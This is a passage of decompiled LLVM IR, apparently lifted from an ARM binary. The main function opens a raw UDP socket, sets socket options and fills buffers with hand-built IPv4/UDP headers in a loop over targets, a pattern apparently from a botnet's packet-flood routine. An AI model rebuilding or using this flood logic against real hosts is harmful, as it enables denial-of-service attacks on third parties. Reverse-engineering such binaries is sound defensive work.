  uselistorder i32 %v3_e414, { 1, 0 }
  uselistorder i32 %v7_e410, { 1, 0 }
  uselistorder i32 %v4_e3d8, { 1, 0 }
  uselistorder i32 %v0_e3d0, { 0, 2, 1 }
  uselistorder i32 %v0_e3b4, { 0, 2, 1 }
  uselistorder i32 %v4_e3a0, { 1, 0 }
  uselistorder i32 %v0_e398, { 0, 2, 1 }
  uselistorder i32 %v2_e36c, { 1, 0 }
  uselistorder i32 %v8_e34c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_e338, { 1, 0 }
  uselistorder i32 %v3_e314, { 2, 3, 1, 0, 4 }
  uselistorder i1 %v2_e308, { 1, 0 }
  uselistorder i32 %v1_e2fc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_e2f8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_e2a0, { 0, 2, 1 }
  uselistorder i32 %v0_e288, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e274, { 1, 0 }
  uselistorder i32 %v2_e270, { 0, 2, 1 }
  uselistorder i1 %v7_e220, { 2, 1, 0 }
  uselistorder i1 %v3_e38c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_e0e436, { 1, 0 }
  uselistorder i8 %v5_e0d0, { 0, 2, 1 }
  uselistorder i32 %v3_e0bc, { 1, 0 }
  uselistorder i32 %v1_e0ac, { 2, 3, 0, 1 }
  uselistorder i32 %v1_e0a8, { 1, 2, 0 }
  uselistorder i32 %v1_e0a0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_e098, { 1, 0 }
  uselistorder i32 %v1_e070, { 1, 0, 2 }
  uselistorder i32 %v3_e050, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v3_e04c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e038, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_e030, { 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_e02c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_e028, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v3_e01c, { 3, 1, 2, 0 }
  uselistorder i1 %v7_e008, { 1, 0 }
  uselistorder i1 %v7_dfdc, { 1, 0 }
  uselistorder i32 %v3_dfd8, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v6_dfc4, { 2, 1, 7, 5, 0, 6, 4, 3 }
  uselistorder i32 %v1_dfb0, { 3, 1, 2, 0 }
  uselistorder i32 %v1_df3c, { 1, 0 }
  uselistorder i8 %v5_df2c, { 1, 0, 2 }
  uselistorder i32 %v5_df10, { 1, 0 }
  uselistorder i8 %v5_def4, { 0, 2, 1 }
  uselistorder i32 %v6_ded4, { 1, 0 }
  uselistorder i32 %v2_debc, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 %v1_dea0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 51, 53, 52, 55, 54, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 9, 8, 11, 10, 12, 13, 14, 16, 15, 18, 17, 19, 21, 20, 27, 22, 23, 24, 25, 26, 32, 28, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32 240, { 1, 0 }
  uselistorder label %dec_label_pc_e404, { 1, 0 }
  uselistorder label %dec_label_pc_e3ec, { 1, 0 }
  uselistorder label %dec_label_pc_e260, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e1e8, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
}

define i32 @function_e528(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e528:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_e528 = load i32, i32* @r4, align 4
  %v6_e528 = load i32, i32* @r5, align 4
  %v9_e528 = load i32, i32* @r6, align 4
  %v12_e528 = load i32, i32* @r7, align 4
  %v1_e52c = urem i32 %arg1, 256
  store i32 %v1_e52c, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @sl, align 4
  %v1_e540 = urem i32 %arg3, 256
  store i32 %v1_e540, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_e548 = call i32 @_calloc(i32 %v1_e52c, i32 4)
  %v0_e54c = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_e558 = load i32, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_e560 = inttoptr i32 %v0_e54c to i32*
  %v6_e560 = call i32 @function_b240(i32 %v0_e558, i32* %v5_e560, i32 2, i32 0)
  %v1_e56c = urem i32 %v6_e560, 256
  store i32 %v1_e56c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_e578 = load i32, i32* @r4, align 4
  %v0_e57c = load i32, i32* @r5, align 4
  %v5_e580 = trunc i32 %v6_e560 to i8
  %v6_e584 = inttoptr i32 %v0_e57c to i32*
  %v7_e584 = call i32 @function_b240(i32 %v0_e578, i32* %v6_e584, i32 3, i32 65535)
  %v0_e588 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_e584, i32* @r7, align 4
  %v0_e598 = load i32, i32* @r4, align 4
  %v4_e59c = inttoptr i32 %v0_e588 to i32*
  %v5_e59c = call i32 @function_b240(i32 %v0_e598, i32* %v4_e59c, i32 4, i32 64)
  %v1_e5a4 = urem i32 %v5_e59c, 256
  store i32 %v1_e5a4, i32* %ip.global-to-local, align 4
  %v0_e5a8 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_e5b4 = load i32, i32* @r4, align 4
  %v5_e5b8 = trunc i32 %v5_e59c to i8
  %v6_e5bc = inttoptr i32 %v0_e5a8 to i32*
  %v7_e5bc = call i32 @function_b240(i32 %v0_e5b4, i32* %v6_e5bc, i32 5, i32 0)
  %v1_e5c8 = urem i32 %v7_e5bc, 256
  store i32 %v1_e5c8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_e5d4 = load i32, i32* @r4, align 4
  %v0_e5d8 = load i32, i32* @r5, align 4
  %v5_e5e0 = inttoptr i32 %v0_e5d8 to i32*
  %v6_e5e0 = call i32 @function_b240(i32 %v0_e5d4, i32* %v5_e5e0, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_e5f0 = load i32, i32* @r5, align 4
  store i32 %v6_e5e0, i32* @r6, align 4
  %v0_e5f8 = load i32, i32* @r4, align 4
  %v4_e5fc = inttoptr i32 %v0_e5f0 to i32*
  %v5_e5fc = call i32 @function_b240(i32 %v0_e5f8, i32* %v4_e5fc, i32 7, i32 27015)
  store i32 %v5_e5fc, i32* @r4, align 4
  %v1_e608 = call i32 @function_13128(i32 29)
  %v3_e614 = call i32 @function_13044(i32 29, i32* nonnull %stack_var_-44)
  store i32 %v3_e614, i32* %r8.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_e628 = call i32 @_socket(i32 2, i32 3, i32 17)
  %v7_e62c = icmp eq i32 %v3_e628, -1
  store i1 %v7_e62c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e628, i32* %fp.global-to-local, align 4
  br i1 %v7_e62c, label %dec_label_pc_e9e0, label %dec_label_pc_e638

dec_label_pc_e638:                                ; preds = %dec_label_pc_e528
  store i32 1, i32* %stack_var_-40, align 4
  %v6_e640 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_e640, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_e654 = call i32 @_setsockopt()
  %v7_e658 = icmp eq i32 %v0_e654, -1
  store i1 %v7_e658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e658, label %dec_label_pc_e9d8, label %dec_label_pc_e660

dec_label_pc_e660:                                ; preds = %dec_label_pc_e638
  %v0_e660 = load i32, i32* @r4, align 4
  %v3_e660 = mul i32 %v0_e660, 65536
  store i32 %v3_e660, i32* %lr.global-to-local, align 4
  %v0_e664 = load i32, i32* @r7, align 4
  %v0_e668 = load i32, i32* @r6, align 4
  %v3_e668 = mul i32 %v0_e668, 65536
  store i32 %v3_e668, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_e670 = urem i32 %v0_e664, 65536
  %v3_e674 = urem i32 %v0_e668, 65536
  store i32 %v3_e674, i32* %r2.global-to-local, align 4
  %v3_e678 = urem i32 %v0_e660, 65536
  store i32 %v3_e678, i32* %r3.global-to-local, align 4
  %v0_e67c = load i32, i32* %sb.global-to-local, align 4
  %v2_e67c = icmp eq i32 %v0_e67c, 0
  store i1 %v2_e67c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp51 = icmp slt i32 %v0_e67c, 1
  br i1 %tmp51, label %dec_label_pc_e800, label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %dec_label_pc_e660
  %v1_e698 = urem i32 %v0_e660, 256
  %v1_e69c = urem i32 %v0_e664, 256
  %v3_e6a0 = mul nuw nsw i32 %v1_e698, 256
  %v1_e6a4 = urem i32 %v0_e668, 256
  %tmp52 = udiv i32 %v0_e664, 256
  %v3_e6a8 = urem i32 %tmp52, 256
  %tmp53 = udiv i32 %v0_e668, 256
  %v3_e6ac = urem i32 %tmp53, 256
  store i32 %v3_e6ac, i32* %ip.global-to-local, align 4
  %v4_e6b0 = mul nuw nsw i32 %v1_e69c, 256
  %v5_e6b0 = or i32 %v4_e6b0, %v3_e6a8
  store i32 %v5_e6b0, i32* %r7.global-to-local, align 4
  %v4_e6b4 = mul nuw nsw i32 %v1_e6a4, 256
  %v5_e6b4 = or i32 %v4_e6b4, %v3_e6ac
  store i32 %v5_e6b4, i32* %r6.global-to-local, align 4
  %tmp54 = udiv i32 %v0_e660, 256
  %v4_e6b8 = urem i32 %tmp54, 256
  %v5_e6b8 = or i32 %v4_e6b8, %v3_e6a0
  store i32 %v5_e6b8, i32* %r5.global-to-local, align 4
  store i32 %v1_e6a4, i32* %r2.global-to-local, align 4
  store i32 %v1_e698, i32* %r3.global-to-local, align 4
  %v2_e734 = icmp eq i32 %v1_e5c8, 0
  %v4_e738 = sext i8 %v5_e5b8 to i32
  %sext = mul i32 %v0_e664, 16777216
  %v4_e754 = sdiv i32 %sext, 16777216
  %sext7 = mul i32 %v0_e668, 16777216
  %v4_e7b0 = sdiv i32 %sext7, 16777216
  %sext8 = mul i32 %v0_e660, 16777216
  %v4_e7d0 = sdiv i32 %sext8, 16777216
  br label %dec_label_pc_e6d4

dec_label_pc_e6d4:                                ; preds = %bb58, %dec_label_pc_e694
  %v2_e6dc = call i32 @_calloc(i32 128, i32 1)
  store i32 %v2_e548, i32* %r2.global-to-local, align 4
  %v3_e6e4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e6e4, i32* %r3.global-to-local, align 4
  %v2_e6e8 = load i32, i32* @r4, align 4
  %v5_e6e8 = mul i32 %v2_e6e8, 4
  %v6_e6e8 = add i32 %v5_e6e8, %v2_e548
  %v7_e6e8 = inttoptr i32 %v6_e6e8 to i32*
  store i32 %v2_e6dc, i32* %v7_e6e8, align 4
  %v0_e6ec = load i32, i32* %r2.global-to-local, align 4
  %v1_e6ec = load i32, i32* %r3.global-to-local, align 4
  %v4_e6ec = mul i32 %v1_e6ec, 4
  %v5_e6ec = add i32 %v4_e6ec, %v0_e6ec
  %v6_e6ec = inttoptr i32 %v5_e6ec to i32*
  %v7_e6ec = load i32, i32* %v6_e6ec, align 4
  store i32 %v7_e6ec, i32* %lr.global-to-local, align 4
  %v1_e6f0 = inttoptr i32 %v7_e6ec to i8*
  %v2_e6f0 = load i8, i8* %v1_e6f0, align 1
  %tmp = urem i8 %v2_e6f0, 16
  %v1_e6f4 = zext i8 %tmp to i32
  %v1_e6f8 = or i32 %v1_e6f4, 64
  store i32 %v1_e6f8, i32* %r3.global-to-local, align 4
  %v1_e6fc = trunc i32 %v1_e6f8 to i8
  store i8 %v1_e6fc, i8* %v1_e6f0, align 1
  %v0_e700 = load i32, i32* %lr.global-to-local, align 4
  %v1_e700 = inttoptr i32 %v0_e700 to i8*
  %v2_e700 = load i8, i8* %v1_e700, align 1
  %v1_e704 = and i8 %v2_e700, -16
  %v1_e708 = or i8 %v1_e704, 5
  store i8 %v1_e708, i8* %v1_e700, align 1
  %v2_e714 = load i32, i32* %lr.global-to-local, align 4
  %v3_e714 = add i32 %v2_e714, 1
  %v4_e714 = inttoptr i32 %v3_e714 to i8*
  store i8 %v5_e580, i8* %v4_e714, align 1
  %v3_e718 = load i32, i32* %stack_var_-44, align 4
  %v1_e71c = add i32 %v3_e718, 32
  %tmp55 = mul i32 %v1_e71c, 256
  %v1_e728 = and i32 %tmp55, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  %tmp56 = udiv i32 %v1_e71c, 256
  %v4_e72c = urem i32 %tmp56, 256
  %v5_e72c = or i32 %v4_e72c, %v1_e728
  store i32 %v5_e72c, i32* %r2.global-to-local, align 4
  store i1 %v2_e734, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_e738, i32* %r3.global-to-local, align 4
  %v2_e73c = load i32, i32* %lr.global-to-local, align 4
  %v3_e73c = add i32 %v2_e73c, 8
  %v4_e73c = inttoptr i32 %v3_e73c to i8*
  store i8 %v5_e5b8, i8* %v4_e73c, align 1
  %v0_e740 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e740, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e6d4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_e744 = load i32, i32* %lr.global-to-local, align 4
  %v4_e744 = add i32 %v3_e744, 6
  %v5_e744 = inttoptr i32 %v4_e744 to i8*
  store i8 64, i8* %v5_e744, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e6d4, %bb
  %v0_e748 = load i32, i32* %r2.global-to-local, align 4
  %v1_e748 = trunc i32 %v0_e748 to i8
  %v2_e748 = load i32, i32* %lr.global-to-local, align 4
  %v3_e748 = add i32 %v2_e748, 2
  %v4_e748 = inttoptr i32 %v3_e748 to i8*
  store i8 %v1_e748, i8* %v4_e748, align 1
  %v0_e74c = load i32, i32* %r2.global-to-local, align 4
  %v3_e74c = sdiv i32 %v0_e74c, 256
  store i32 %v3_e74c, i32* %ip.global-to-local, align 4
  store i32 %v4_e754, i32* %r2.global-to-local, align 4
  %v2_e758 = load i32, i32* %lr.global-to-local, align 4
  %v3_e758 = add i32 %v2_e758, 9
  %v4_e758 = inttoptr i32 %v3_e758 to i8*
  store i8 17, i8* %v4_e758, align 1
  store i32 ptrtoint (i32* @global_var_1cdf4.141 to i32), i32* %r3.global-to-local, align 4
  %v0_e760 = load i32, i32* %r2.global-to-local, align 4
  %v1_e760 = trunc i32 %v0_e760 to i8
  %v2_e760 = load i32, i32* %lr.global-to-local, align 4
  %v3_e760 = add i32 %v2_e760, 5
  %v4_e760 = inttoptr i32 %v3_e760 to i8*
  store i8 %v1_e760, i8* %v4_e760, align 1
  %v0_e764 = load i32, i32* %ip.global-to-local, align 4
  %v1_e764 = trunc i32 %v0_e764 to i8
  %v2_e764 = load i32, i32* %lr.global-to-local, align 4
  %v3_e764 = add i32 %v2_e764, 3
  %v4_e764 = inttoptr i32 %v3_e764 to i8*
  store i8 %v1_e764, i8* %v4_e764, align 1
  %v0_e768 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e768, label %.thread9, label %bb57

.thread9:                                         ; preds = %.thread
  %v3_e76c10 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e76c10, i32* %ip.global-to-local, align 4
  br label %bb58

bb57:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e76c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e76c, i32* %ip.global-to-local, align 4
  %v3_e770 = load i32, i32* %lr.global-to-local, align 4
  %v4_e770 = add i32 %v3_e770, 7
  %v5_e770 = inttoptr i32 %v4_e770 to i8*
  store i8 0, i8* %v5_e770, align 1
  %v0_e778.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %.thread9, %bb57
  %v0_e778 = phi i32 [ %v3_e76c10, %.thread9 ], [ %v0_e778.pre, %bb57 ]
  %v2_e774 = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_e774, i32* %r2.global-to-local, align 4
  %v3_e778 = mul i32 %v0_e778, 32
  store i32 %v3_e778, i32* %r3.global-to-local, align 4
  %v1_e77c = load i32, i32* %lr.global-to-local, align 4
  %v2_e77c = add i32 %v1_e77c, 12
  %v3_e77c = inttoptr i32 %v2_e77c to i32*
  store i32 %v2_e774, i32* %v3_e77c, align 4
  %v0_e780 = load i32, i32* %r3.global-to-local, align 4
  %v1_e780 = load i32, i32* %ip.global-to-local, align 4
  %tmp61 = mul i32 %v1_e780, -8
  %v5_e780 = add i32 %v0_e780, %tmp61
  %v1_e784 = load i32, i32* @sl, align 4
  %v2_e784 = add i32 %v5_e780, %v1_e784
  store i32 %v2_e784, i32* %r3.global-to-local, align 4
  %v1_e788 = add i32 %v2_e784, 16
  %v2_e788 = inttoptr i32 %v1_e788 to i32*
  %v3_e788 = load i32, i32* %v2_e788, align 4
  %v1_e78c = load i32, i32* %lr.global-to-local, align 4
  %v2_e78c = add i32 %v1_e78c, 16
  %v3_e78c = inttoptr i32 %v2_e78c to i32*
  store i32 %v3_e788, i32* %v3_e78c, align 4
  %v3_e790 = load i32, i32* %stack_var_-44, align 4
  %v1_e794 = add i32 %v3_e790, 12
  %tmp59 = mul i32 %v1_e794, 256
  %v1_e7a4 = and i32 %tmp59, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  %tmp60 = udiv i32 %v1_e794, 256
  %v4_e7a8 = urem i32 %tmp60, 256
  %v5_e7a8 = or i32 %v4_e7a8, %v1_e7a4
  store i32 %v5_e7a8, i32* %ip.global-to-local, align 4
  %v1_e7ac = load i32, i32* %lr.global-to-local, align 4
  %v2_e7ac = add i32 %v1_e7ac, 28
  %v3_e7ac = inttoptr i32 %v2_e7ac to i32*
  store i32 -1, i32* %v3_e7ac, align 4
  store i32 %v4_e7b0, i32* %r2.global-to-local, align 4
  %v0_e7b4 = load i32, i32* %lr.global-to-local, align 4
  %v1_e7b4 = add i32 %v0_e7b4, 20
  store i32 %v1_e7b4, i32* %r4.global-to-local, align 4
  %v0_e7b8 = load i32, i32* %ip.global-to-local, align 4
  %v3_e7b8 = sdiv i32 %v0_e7b8, 256
  store i32 %v3_e7b8, i32* %r3.global-to-local, align 4
  %v0_e7bc = load i32, i32* %r7.global-to-local, align 4
  %v1_e7bc = trunc i32 %v0_e7bc to i8
  %v3_e7bc = add i32 %v0_e7b4, 4
  %v4_e7bc = inttoptr i32 %v3_e7bc to i8*
  store i8 %v1_e7bc, i8* %v4_e7bc, align 1
  %v0_e7c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_e7c0 = trunc i32 %v0_e7c0 to i8
  %v2_e7c0 = load i32, i32* %lr.global-to-local, align 4
  %v3_e7c0 = add i32 %v2_e7c0, 20
  %v4_e7c0 = inttoptr i32 %v3_e7c0 to i8*
  store i8 %v1_e7c0, i8* %v4_e7c0, align 1
  %v0_e7c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e7c4 = trunc i32 %v0_e7c4 to i8
  %v2_e7c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_e7c4 = add i32 %v2_e7c4, 5
  %v4_e7c4 = inttoptr i32 %v3_e7c4 to i8*
  store i8 %v1_e7c4, i8* %v4_e7c4, align 1
  %v0_e7c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_e7c8 = trunc i32 %v0_e7c8 to i8
  %v2_e7c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_e7c8 = add i32 %v2_e7c8, 2
  %v4_e7c8 = inttoptr i32 %v3_e7c8 to i8*
  store i8 %v1_e7c8, i8* %v4_e7c8, align 1
  %v0_e7cc = load i32, i32* %r2.global-to-local, align 4
  %v1_e7cc = trunc i32 %v0_e7cc to i8
  %v2_e7cc = load i32, i32* %r4.global-to-local, align 4
  %v3_e7cc = add i32 %v2_e7cc, 1
  %v4_e7cc = inttoptr i32 %v3_e7cc to i8*
  store i8 %v1_e7cc, i8* %v4_e7cc, align 1
  store i32 %v4_e7d0, i32* %r3.global-to-local, align 4
  %v0_e7d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e7d4 = trunc i32 %v0_e7d4 to i8
  %v2_e7d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_e7d4 = add i32 %v2_e7d4, 4
  %v4_e7d4 = inttoptr i32 %v3_e7d4 to i8*
  store i8 %v1_e7d4, i8* %v4_e7d4, align 1
  %v0_e7d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e7d8 = trunc i32 %v0_e7d8 to i8
  %v2_e7d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_e7d8 = add i32 %v2_e7d8, 3
  %v4_e7d8 = inttoptr i32 %v3_e7d8 to i8*
  store i8 %v1_e7d8, i8* %v4_e7d8, align 1
  %v0_e7dc = load i32, i32* %r8.global-to-local, align 4
  %v0_e7e0 = load i32, i32* %lr.global-to-local, align 4
  %v1_e7e0 = add i32 %v0_e7e0, 32
  %v3_e7e4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_e7e4, i32* %r2.global-to-local, align 4
  %v3_e7e8 = call i32 @function_13ad0(i32 %v1_e7e0, i32 %v0_e7dc, i32 %v3_e7e4)
  %v3_e7ec = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e7ec, i32* %r3.global-to-local, align 4
  %v1_e7f0 = add i32 %v3_e7ec, 1
  store i32 %v1_e7f0, i32* @r4, align 4
  %v1_e7f4 = load i32, i32* %sb.global-to-local, align 4
  %v9_e7f4 = icmp eq i32 %v1_e7f0, %v1_e7f4
  store i1 %v9_e7f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e7f0, i32* %stack_var_-40, align 4
  %v5_e7fc = icmp slt i32 %v1_e7f0, %v1_e7f4
  br i1 %v5_e7fc, label %dec_label_pc_e6d4, label %dec_label_pc_e800

dec_label_pc_e800:                                ; preds = %bb58, %dec_label_pc_e660
  %v0_e800 = phi i32 [ %v0_e67c, %dec_label_pc_e660 ], [ %v1_e7f4, %bb58 ]
  %v2_e800 = icmp eq i32 %v0_e800, 0
  store i1 %v2_e800, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e848 = icmp eq i32 %v3_e670, 65535
  br label %dec_label_pc_e808.outer

dec_label_pc_e808.outer:                          ; preds = %dec_label_pc_e918, %dec_label_pc_e800
  %v1_e808.ph.in = phi i32 [ %v1_e90c, %dec_label_pc_e918 ], [ %v0_e800, %dec_label_pc_e800 ]
  %v0_e808.ph = phi i1 [ %v2_e918, %dec_label_pc_e918 ], [ %v2_e800, %dec_label_pc_e800 ]
  %v1_e808.ph = icmp slt i32 %v1_e808.ph.in, 0
  %v4_e808 = or i1 %v1_e808.ph, %v0_e808.ph
  br label %dec_label_pc_e808

dec_label_pc_e808:                                ; preds = %dec_label_pc_e808.outer, %dec_label_pc_e808
  br i1 %v4_e808, label %dec_label_pc_e808, label %dec_label_pc_e80c

dec_label_pc_e80c:                                ; preds = %dec_label_pc_e808
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e818

dec_label_pc_e818:                                ; preds = %dec_label_pc_e868, %dec_label_pc_e80c
  %v1_e82c = phi i32 [ %v1_e908, %dec_label_pc_e868 ], [ 0, %dec_label_pc_e80c ]
  %v5_e81c = mul i32 %v1_e82c, 24
  %v1_e820 = load i32, i32* @sl, align 4
  %v2_e820 = add i32 %v1_e820, %v5_e81c
  store i32 %v2_e820, i32* %r3.global-to-local, align 4
  %v1_e828 = add i32 %v2_e820, 20
  %v2_e828 = inttoptr i32 %v1_e828 to i8*
  %v3_e828 = load i8, i8* %v2_e828, align 1
  %v4_e828 = zext i8 %v3_e828 to i32
  store i32 %v4_e828, i32* %r2.global-to-local, align 4
  %v4_e82c = mul i32 %v1_e82c, 4
  %v5_e82c = add i32 %v4_e82c, %v2_e548
  %v6_e82c = inttoptr i32 %v5_e82c to i32*
  %v7_e82c = load i32, i32* %v6_e82c, align 4
  store i32 %v7_e82c, i32* @r5, align 4
  %v7_e834 = icmp eq i8 %v3_e828, 31
  store i1 %v7_e834, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* %r7.global-to-local, align 4
  %v1_e83c = add i32 %v7_e82c, 20
  store i32 %v1_e83c, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_e828, 32
  br i1 %tmp62, label %dec_label_pc_e924, label %dec_label_pc_e844

dec_label_pc_e844:                                ; preds = %dec_label_pc_e818
  store i32 %v3_e670, i32* %r2.global-to-local, align 4
  store i1 %v3_e848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e848, label %dec_label_pc_e98c, label %dec_label_pc_e850

dec_label_pc_e850:                                ; preds = %dec_label_pc_e924.dec_label_pc_e850_crit_edge, %dec_label_pc_e844
  %v1_e854 = phi i32 [ %v1_e854.pre, %dec_label_pc_e924.dec_label_pc_e850_crit_edge ], [ 65535, %dec_label_pc_e844 ]
  store i32 %v3_e674, i32* %r3.global-to-local, align 4
  %v9_e854 = icmp eq i32 %v3_e674, %v1_e854
  store i1 %v9_e854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e854, label %dec_label_pc_e9a8, label %dec_label_pc_e85c

dec_label_pc_e85c:                                ; preds = %dec_label_pc_e98c.dec_label_pc_e85c_crit_edge, %dec_label_pc_e850
  %v1_e860 = phi i32 [ %v1_e860.pre, %dec_label_pc_e98c.dec_label_pc_e85c_crit_edge ], [ %v1_e854, %dec_label_pc_e850 ]
  %v9_e860 = icmp eq i32 %v3_e678, %v1_e860
  store i1 %v9_e860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e860, label %dec_label_pc_e9c4, label %dec_label_pc_e868

dec_label_pc_e868:                                ; preds = %dec_label_pc_e9a8, %dec_label_pc_e85c, %dec_label_pc_e9c4
  %v0_e86c = load i32, i32* %r8.global-to-local, align 4
  %v1_e86c = trunc i32 %v0_e86c to i8
  %v2_e86c = load i32, i32* @r5, align 4
  %v3_e86c = add i32 %v2_e86c, 10
  %v4_e86c = inttoptr i32 %v3_e86c to i8*
  store i8 %v1_e86c, i8* %v4_e86c, align 1
  %v0_e870 = load i32, i32* %r8.global-to-local, align 4
  %v1_e870 = trunc i32 %v0_e870 to i8
  %v2_e870 = load i32, i32* @r5, align 4
  %v3_e870 = add i32 %v2_e870, 11
  %v4_e870 = inttoptr i32 %v3_e870 to i8*
  store i8 %v1_e870, i8* %v4_e870, align 1
  %v0_e874 = load i32, i32* @r5, align 4
  store i32 %v0_e874, i32* @r0, align 4
  %v2_e878 = call i32 @function_f19c(i32 %v0_e874, i32 20)
  %v3_e878 = trunc i32 %v2_e878 to i8
  %v4_e87c = sdiv i32 %v2_e878, 256
  store i32 %v4_e87c, i32* %r3.global-to-local, align 4
  %v1_e880 = trunc i32 %v4_e87c to i8
  %v2_e880 = load i32, i32* @r5, align 4
